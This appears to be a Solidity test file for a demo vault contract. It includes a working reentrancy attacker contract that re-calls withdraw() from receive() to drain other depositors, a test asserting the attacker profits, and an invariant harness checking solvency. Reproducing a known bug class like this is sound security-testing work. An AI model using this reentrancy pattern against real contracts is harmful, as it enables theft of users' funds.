// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {TestBase, InvariantBase} from "./utils/TestBase.sol";
import {ReentrantVault} from "../src/demo/ReentrantVault.sol";

contract Reenterer {
    ReentrantVault vault;
    uint256 public rounds;

    constructor(ReentrantVault v) {
        vault = v;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && rounds < 20) {
            rounds++;
            vault.withdraw();
        }
    }
}

contract ReentrantVaultTest is TestBase {
    ReentrantVault vault;

    function setUp() public {
        vault = new ReentrantVault();
        vm.deal(address(0xA11CE), 10 ether);
        vm.prank(address(0xA11CE));
        vault.deposit{value: 10 ether}();
    }

    /// Reproduces the reentrancy on our own vault: 1 ETH in, more than 1 ETH out.
    function test_reentrancyDrainsOtherDepositors() public {
        Reenterer r = new Reenterer(vault);
        vm.deal(address(this), 1 ether);
        r.attack{value: 1 ether}();
        assertTrue(address(r).balance > 1 ether, "attacker did not gain");
    }
}

/// Invariant: the vault always holds at least the sum of recorded balances.
/// Honest users never break it; the reentrancy proof above does. This shows the
/// invariant harness the scanner uses for its own generated tests.
contract VaultHandler is TestBase {
    ReentrantVault public vault;
    uint256 public sumDeposits;

    constructor(ReentrantVault v) {
        vault = v;
    }

    function deposit(uint96 amount) external {
        amount = uint96(bound(amount, 1, 5 ether));
        vm.deal(address(this), amount);
        vault.deposit{value: amount}();
        sumDeposits += amount;
    }

    function withdraw() external {
        if (vault.balances(address(this)) == 0) return;
        sumDeposits -= vault.balances(address(this));
        vault.withdraw();
    }

    function bound(uint256 x, uint256 lo, uint256 hi) internal pure returns (uint256) {
        return lo + (x % (hi - lo + 1));
    }

    receive() external payable {}
}

contract ReentrantVaultInvariantTest is InvariantBase {
    ReentrantVault vault;
    VaultHandler handler;

    function setUp() public {
        vault = new ReentrantVault();
        handler = new VaultHandler(vault);
        targetContract(address(handler));
    }

    function invariant_solvent() public view {
        require(address(vault).balance >= handler.sumDeposits(), "insolvent");
    }
}
